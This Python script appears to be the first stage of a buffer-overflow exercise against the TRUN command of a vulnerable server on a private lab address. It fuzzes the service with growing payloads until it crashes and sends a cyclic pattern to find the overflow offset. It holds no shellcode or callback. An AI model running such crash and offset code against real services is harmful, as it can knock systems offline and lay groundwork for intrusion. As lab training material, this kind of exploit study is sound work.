import socket
from time import sleep
from pwn import cyclic, cyclic_find
from binascii import unhexlify


HOST = "192.168.56.1"
PORT = 9999

def fuzzing():
    buffer = b"A" * 100
    while True:
        with socket.create_connection((HOST,PORT), timeout=5) as s:
            try:
                s.sendall( b"TRUN /.:/" + buffer)
                data = s.recv(4096)
                s.close()
                sleep(1)
                buffer = buffer +  (b"A"*100)
                print (">>> Fuzzing Attempt Recieved: ", data)
                print (f">>> {len(buffer)}")
            except:
                print (">>> Crashed at %s bytes" % str(len(buffer)))
                break
def offset():
    try:
        offset_pattern = cyclic(2000)
        if isinstance(offset_pattern, str):
            offset_pattern = offset_pattern.encode('latin-1')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST,PORT))
        s.sendall(b'TRUN /.:/' + bytes(offset_pattern) + b"\r\n")
        s.close()
    except:
        print ("Error Connecting to Server")

def main():
    #fuzzing()
    offset()

if __name__ == "__main__":
    main()